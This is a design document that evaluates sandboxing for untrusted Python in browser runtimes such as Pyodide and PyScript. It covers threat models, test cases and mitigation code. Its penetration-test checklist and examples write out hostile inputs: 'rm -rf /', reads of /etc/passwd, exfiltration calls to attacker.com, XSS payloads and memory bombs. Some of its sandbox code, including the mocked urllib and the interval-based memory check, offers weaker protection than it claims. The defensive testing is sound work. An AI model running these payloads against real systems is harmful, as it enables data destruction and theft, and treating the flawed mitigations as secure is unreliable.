# Use Case: Security & Sandboxing

## Industry Context

Educational platforms where students run untrusted code, coding challenges/competitions, online IDEs, browser-based development environments, interactive documentation with user-submitted examples. Critical requirement: execute arbitrary Python code safely without compromising host application or user data.

## Requirements Definition

### Critical Requirements (Must Have)
- **Filesystem Isolation**: No access to host filesystem
- **Network Isolation**: No unauthorized external requests
- **DOM Isolation**: Python can't manipulate parent page DOM
- **Resource Limits**: Prevent infinite loops/memory exhaustion
- **XSS Prevention**: User code can't inject malicious JavaScript
- **No Code Escape**: Can't break out of Python sandbox

### Important Requirements (Should Have)
- **Timeout Enforcement**: Kill runaway computations
- **Memory Caps**: Limit heap allocation
- **CPU Throttling**: Prevent browser freeze
- **Safe Package Install**: Restrict pip to approved packages
- **Audit Logging**: Track what code executes

### Nice to Have
- **Multi-tenancy**: Isolate users from each other
- **Quota System**: Rate limiting per user
- **Rollback**: Undo dangerous operations
- **Introspection Limits**: Restrict reflection/introspection

## Threat Model

### Attack Vectors
1. **Filesystem Access**: Read sensitive data, write malware
2. **Network Exfiltration**: Send data to attacker server
3. **DOM Manipulation**: Inject malicious HTML/JavaScript
4. **Resource Exhaustion**: Crash browser with infinite loop/memory leak
5. **Cross-Context Interference**: Access other users' sessions
6. **Browser API Abuse**: Access camera, location, storage APIs

### Attacker Goals
- Steal credentials/tokens from page
- Inject XSS payload
- Crash browser (DoS)
- Access local filesystem
- Pivot to other origins

## Solution Evaluation

### Pyodide Security Model

**Architecture**:
```
Browser Context
├─ Main JavaScript (trusted)
├─ Pyodide WebAssembly (sandboxed)
│  ├─ CPython Interpreter
│  ├─ Standard Library
│  └─ User Code (untrusted)
└─ Browser APIs (protected)
```

**Validation Tests**:

#### Test 1: Filesystem Access
```python
# Attempt to read filesystem
import os
os.listdir('/')  # What happens?

# Result: ✅ SAFE
# Pyodide provides virtual filesystem (Emscripten FS)
# Returns: ['home', 'tmp', 'dev'] (virtual directories)
# Cannot access real host filesystem
```

#### Test 2: Network Requests
```python
# Attempt network exfiltration
import urllib.request
urllib.request.urlopen('https://attacker.com/steal?data=secret')

# Result: ⚠️ ALLOWED (with CORS restrictions)
# Pyodide can make HTTP requests
# Subject to browser CORS policy
# MITIGATION NEEDED: Proxy/firewall external requests
```

#### Test 3: DOM Manipulation
```python
# Attempt to inject JavaScript
from js import document, eval
document.body.innerHTML = '<script>alert("XSS")</script>'

# Result: ⚠️ DEPENDS ON API EXPOSURE
# If `js` module available: CAN access DOM
# If not imported: SAFE
# MITIGATION: Don't import js module for untrusted code
```

#### Test 4: Infinite Loop
```python
# Attempt resource exhaustion
while True:
    pass  # Infinite loop

# Result: ❌ FREEZES TAB
# No automatic timeout
# Browser's "unresponsive script" warning eventually appears
# MITIGATION NEEDED: Manual timeout enforcement
```

#### Test 5: Memory Exhaustion
```python
# Attempt memory bomb
data = []
while True:
    data.append('x' * 1000000)  # Allocate 1MB per iteration

# Result: ❌ CRASHES TAB
# WebAssembly memory grows until browser kills tab
# MITIGATION NEEDED: Monitor memory usage
```

#### Test 6: Module Introspection
```python
# Attempt to inspect/modify internals
import sys
sys.modules  # Access to all loaded modules

# Attempt to override builtins
import builtins
builtins.print = lambda *args: None  # Disable print

# Result: ⚠️ ALLOWED
# Python allows introspection/modification
# MITIGATION: Run in isolated namespace, restore after execution
```

**Security Summary**:
- ✅ Filesystem isolated (virtual FS)
- ⚠️ Network NOT isolated (CORS only)
- ⚠️ DOM access depends on API exposure
- ❌ No resource limits by default
- ⚠️ Can modify Python internals

### PyScript Security

**Additional Protections**:
```html
<py-config>
    # Restrict package installation
    packages = []  # Empty = no packages allowed
</py-config>

<py-script>
    # Code runs in restricted environment
    # js module not auto-imported (safer default)
</py-script>
```

**Validation Tests**:

#### Test 1: JS Module Access
```python
# Attempt to access JavaScript
from js import window
window.location = 'https://attacker.com'

# Result: ❌ IMPORT ERROR (if not configured)
# PyScript doesn't expose js module by default
# Safer than raw Pyodide for untrusted code
```

#### Test 2: Package Installation
```python
# Attempt to install malicious package
import micropip
await micropip.install('evil-package')

# Result: ⚠️ DEPENDS ON CONFIG
# If micropip available: Can install
# If restricted: Import error
# MITIGATION: Whitelist approved packages only
```

**Security Summary**:
- ✅ DOM access disabled by default (better than raw Pyodide)
- ⚠️ Same Pyodide limitations (no timeouts, network)
- ⚠️ Package installation depends on configuration

### JupyterLite Security

**Environment**:
```
JupyterLite (full notebook environment)
├─ Pyodide Kernel
├─ File System (browser storage)
└─ Network access (CORS)
```

**Validation Tests**:

#### Test 1: File Upload/Download
```python
# Attempt to access uploaded files
from js import document
# Can read files uploaded by user
# CANNOT access files from other origins

# Result: ⚠️ LIMITED ACCESS
# Can only access user's uploaded files
# No access to host filesystem
```

**Security Summary**:
- ⚠️ More attack surface (full Jupyter UI)
- ⚠️ File upload/download features need validation
- ⚠️ Extensions/plugins could introduce vulnerabilities

## Mitigation Strategies

### 1. Timeout Enforcement

**Web Worker with Timeout**:
```javascript
// Run Python code in Web Worker with timeout
class SafePythonRunner {
    constructor(timeoutMs = 5000) {
        this.timeout = timeoutMs;
        this.worker = null;
    }

    async runCode(code) {
        return new Promise((resolve, reject) => {
            // Create worker
            this.worker = new Worker('pyodide-worker.js');

            // Set timeout
            const timer = setTimeout(() => {
                this.worker.terminate();
                reject(new Error('Execution timeout'));
            }, this.timeout);

            // Handle result
            this.worker.onmessage = (e) => {
                clearTimeout(timer);
                this.worker.terminate();
                resolve(e.data);
            };

            // Handle error
            this.worker.onerror = (e) => {
                clearTimeout(timer);
                this.worker.terminate();
                reject(e);
            };

            // Send code
            this.worker.postMessage({ code });
        });
    }
}

// Usage
const runner = new SafePythonRunner(5000);  // 5 second timeout
try {
    const result = await runner.runCode('while True: pass');
} catch (err) {
    console.log('Execution killed:', err.message);
}
```

**pyodide-worker.js**:
```javascript
importScripts('https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js');

let pyodide;

async function init() {
    pyodide = await loadPyodide();
}

self.onmessage = async (e) => {
    if (!pyodide) await init();

    try {
        const result = pyodide.runPython(e.data.code);
        self.postMessage({ result });
    } catch (err) {
        self.postMessage({ error: err.message });
    }
};

init();
```

### 2. Isolated Namespace

**Prevent Builtin Tampering**:
```javascript
async function runSandboxed(code) {
    // Create isolated namespace
    const namespace = pyodide.pyimport('builtins').dict();

    // Inject safe builtins only
    pyodide.runPython(`
        import builtins

        # Create safe namespace
        safe_builtins = {
            'print': print,
            'len': len,
            'range': range,
            'int': int,
            'float': float,
            'str': str,
            'list': list,
            'dict': dict,
            # ... approved builtins only
        }
    `, { globals: namespace });

    // Run user code in isolated namespace
    const result = pyodide.runPython(code, { globals: namespace });

    return result;
}
```

### 3. Network Isolation

**Intercept HTTP Requests**:
```python
# Patch urllib to block requests
import sys
from unittest.mock import MagicMock

# Mock urllib to prevent network access
sys.modules['urllib'] = MagicMock()
sys.modules['urllib.request'] = MagicMock()

# Now user code can't make requests
import urllib.request
urllib.request.urlopen('https://attacker.com')  # Fails safely
```

**Or use Service Worker to whitelist**:
```javascript
// service-worker.js
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Whitelist allowed domains
    const allowedDomains = ['api.example.com', 'cdn.example.com'];

    if (allowedDomains.some(domain => url.hostname.endsWith(domain))) {
        return;  // Allow request
    }

    // Block all other requests from Python
    event.respondWith(new Response('Network access denied', { status: 403 }));
});
```

### 4. Memory Monitoring

**Track Memory Usage**:
```javascript
async function runWithMemoryLimit(code, maxMemoryMB = 100) {
    const initialMemory = performance.memory?.usedJSHeapSize || 0;

    // Monitor memory during execution
    const monitor = setInterval(() => {
        const currentMemory = performance.memory?.usedJSHeapSize || 0;
        const usedMB = (currentMemory - initialMemory) / 1024 / 1024;

        if (usedMB > maxMemoryMB) {
            clearInterval(monitor);
            throw new Error(`Memory limit exceeded: ${usedMB.toFixed(2)}MB`);
        }
    }, 100);

    try {
        const result = await pyodide.runPythonAsync(code);
        clearInterval(monitor);
        return result;
    } catch (err) {
        clearInterval(monitor);
        throw err;
    }
}
```

### 5. Package Whitelisting

**Restrict micropip**:
```python
# Override micropip.install
import micropip

ALLOWED_PACKAGES = ['numpy', 'pandas', 'matplotlib']

original_install = micropip.install

async def safe_install(package):
    package_name = package.split('==')[0]  # Remove version specifier
    if package_name not in ALLOWED_PACKAGES:
        raise PermissionError(f'Package {package_name} not in whitelist')
    return await original_install(package)

micropip.install = safe_install
```

### 6. Iframe Isolation

**Ultimate Sandboxing**:
```html
<!-- Run Python in sandboxed iframe -->
<iframe
    sandbox="allow-scripts"
    src="python-executor.html"
    style="display: none;">
</iframe>

<script>
    const iframe = document.querySelector('iframe');

    function runPython(code) {
        return new Promise((resolve) => {
            // Listen for result
            window.addEventListener('message', function handler(e) {
                if (e.source === iframe.contentWindow) {
                    window.removeEventListener('message', handler);
                    resolve(e.data);
                }
            });

            // Send code to iframe
            iframe.contentWindow.postMessage({ code }, '*');
        });
    }

    // Usage
    const result = await runPython('print("Hello from sandbox")');
</script>
```

**python-executor.html** (in iframe):
```html
<script src="https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js"></script>
<script>
    let pyodide;

    async function init() {
        pyodide = await loadPyodide();
    }

    window.addEventListener('message', async (e) => {
        if (!pyodide) await init();

        try {
            const result = pyodide.runPython(e.data.code);
            window.parent.postMessage({ result }, '*');
        } catch (err) {
            window.parent.postMessage({ error: err.message }, '*');
        }
    });

    init();
</script>
```

**Iframe Sandbox Attributes**:
```html
<iframe
    sandbox="allow-scripts"           <!-- Allow JavaScript -->
    <!-- Explicitly DENY: -->
    <!-- allow-same-origin: Prevent access to cookies/storage -->
    <!-- allow-top-navigation: Prevent redirecting parent -->
    <!-- allow-forms: Prevent form submission -->
    src="python-executor.html">
</iframe>
```

## Security Comparison Matrix

| Attack Vector | Pyodide Raw | PyScript | JupyterLite | Mitigation |
|--------------|-------------|----------|-------------|------------|
| Filesystem Access | ✅ Safe (virtual) | ✅ Safe | ✅ Safe | Built-in |
| Network Requests | ❌ Allowed | ❌ Allowed | ❌ Allowed | Service Worker filter |
| DOM Manipulation | ⚠️ If js imported | ✅ Safe (default) | ⚠️ Possible | Don't expose js module |
| Infinite Loop | ❌ Hangs | ❌ Hangs | ❌ Hangs | Web Worker timeout |
| Memory Bomb | ❌ Crashes | ❌ Crashes | ❌ Crashes | Memory monitoring |
| XSS Injection | ⚠️ If DOM exposed | ✅ Safe (default) | ⚠️ Possible | Sandbox iframe |
| Package Install | ⚠️ Unrestricted | ⚠️ Config | ⚠️ Unrestricted | Whitelist packages |
| Introspection | ⚠️ Full access | ⚠️ Full access | ⚠️ Full access | Isolated namespace |

## Best Practices for Production

### 1. Defense in Depth

```javascript
class SecurePythonRunner {
    constructor() {
        this.timeout = 5000;          // 5 second timeout
        this.maxMemoryMB = 100;        // 100MB memory limit
        this.allowedPackages = ['numpy', 'pandas'];
        this.worker = null;
    }

    async runCode(code) {
        // 1. Web Worker isolation
        this.worker = new Worker('secure-pyodide-worker.js');

        // 2. Timeout enforcement
        const timeoutPromise = new Promise((_, reject) =>
            setTimeout(() => {
                this.worker.terminate();
                reject(new Error('Timeout'));
            }, this.timeout)
        );

        // 3. Execute with all protections
        const executePromise = new Promise((resolve, reject) => {
            this.worker.onmessage = (e) => {
                this.worker.terminate();
                if (e.data.error) reject(new Error(e.data.error));
                else resolve(e.data.result);
            };

            this.worker.postMessage({
                code,
                maxMemoryMB: this.maxMemoryMB,
                allowedPackages: this.allowedPackages
            });
        });

        // 4. Race timeout vs execution
        return Promise.race([executePromise, timeoutPromise]);
    }
}
```

### 2. Secure Worker Implementation

```javascript
// secure-pyodide-worker.js
importScripts('https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js');

let pyodide;

async function init() {
    pyodide = await loadPyodide();

    // Patch dangerous modules
    pyodide.runPython(`
        import sys
        from unittest.mock import MagicMock

        # Block network access
        sys.modules['urllib'] = MagicMock()
        sys.modules['urllib.request'] = MagicMock()
        sys.modules['http'] = MagicMock()
        sys.modules['http.client'] = MagicMock()

        # Block filesystem writes (reads are already virtual)
        import builtins
        original_open = builtins.open
        def safe_open(file, mode='r', *args, **kwargs):
            if 'w' in mode or 'a' in mode:
                raise PermissionError('Write access denied')
            return original_open(file, mode, *args, **kwargs)
        builtins.open = safe_open
    `);
}

self.onmessage = async (e) => {
    if (!pyodide) await init();

    const { code, maxMemoryMB, allowedPackages } = e.data;

    try {
        // Create isolated namespace
        const namespace = pyodide.pyimport('builtins').dict();

        // Memory monitoring
        const initialMemory = performance.memory?.usedJSHeapSize || 0;

        // Execute code
        pyodide.runPython(`
            import sys
            from io import StringIO
            sys.stdout = StringIO()
        `, { globals: namespace });

        pyodide.runPython(code, { globals: namespace });

        const output = pyodide.runPython('sys.stdout.getvalue()', { globals: namespace });

        // Check memory usage
        const currentMemory = performance.memory?.usedJSHeapSize || 0;
        const usedMB = (currentMemory - initialMemory) / 1024 / 1024;

        if (usedMB > maxMemoryMB) {
            throw new Error(`Memory limit exceeded: ${usedMB.toFixed(2)}MB`);
        }

        self.postMessage({ result: output });
    } catch (err) {
        self.postMessage({ error: err.message });
    }
};

init();
```

### 3. Rate Limiting

```javascript
class RateLimitedRunner {
    constructor() {
        this.executions = new Map();  // user_id -> timestamps[]
        this.maxPerMinute = 10;
    }

    canExecute(userId) {
        const now = Date.now();
        const userExecs = this.executions.get(userId) || [];

        // Remove executions older than 1 minute
        const recent = userExecs.filter(t => now - t < 60000);

        if (recent.length >= this.maxPerMinute) {
            return false;
        }

        this.executions.set(userId, [...recent, now]);
        return true;
    }
}
```

## Testing Security

### Penetration Testing Checklist

```python
# Test Suite for Security Validation

# Test 1: Filesystem escape attempts
test_cases = [
    "import os; os.system('rm -rf /')",
    "open('/etc/passwd').read()",
    "import subprocess; subprocess.run(['ls', '/'])",
    "__import__('os').listdir('/')"
]

# Test 2: Network exfiltration attempts
test_cases += [
    "import urllib.request; urllib.request.urlopen('https://attacker.com')",
    "import http.client; http.client.HTTPConnection('attacker.com')",
    "import socket; socket.create_connection(('attacker.com', 80))"
]

# Test 3: DOM/XSS injection attempts
test_cases += [
    "from js import document; document.body.innerHTML = '<script>alert(1)</script>'",
    "from js import eval; eval('alert(1)')",
    "from js import window; window.location = 'https://attacker.com'"
]

# Test 4: Resource exhaustion attempts
test_cases += [
    "while True: pass",  # Infinite loop
    "x = 'a' * 10**10",  # Memory bomb
    "[x for x in range(10**10)]",  # CPU exhaustion
]

# All should be safely caught/prevented
```

## Recommendation

### For Untrusted Code Execution: **Multi-Layer Defense**

**Required Protections**:
1. ✅ **Web Worker**: Isolate from main thread
2. ✅ **Timeout**: Kill runaway code (5s default)
3. ✅ **Memory Limit**: Monitor and cap allocation (100MB)
4. ✅ **Network Filter**: Block/whitelist external requests
5. ✅ **No DOM Access**: Don't expose js module
6. ✅ **Package Whitelist**: Restrict pip installs
7. ✅ **Iframe Sandbox**: Ultimate isolation (optional but recommended)

**Implementation Stack**:
```
Iframe (sandbox="allow-scripts")
└─ Web Worker
   └─ Pyodide (patched modules)
      └─ Isolated Namespace
         └─ User Code
```

**Risk Assessment**:
- ✅ Filesystem: SAFE (virtual FS)
- ✅ DOM/XSS: SAFE (no js module)
- ✅ Infinite Loop: SAFE (timeout)
- ✅ Memory: SAFE (monitoring)
- ⚠️ Network: DEPENDS (filter needed)

**Bottom Line**: Pyodide CAN be secured for untrusted code, but requires deliberate defensive engineering. Not secure by default - must implement all protections.
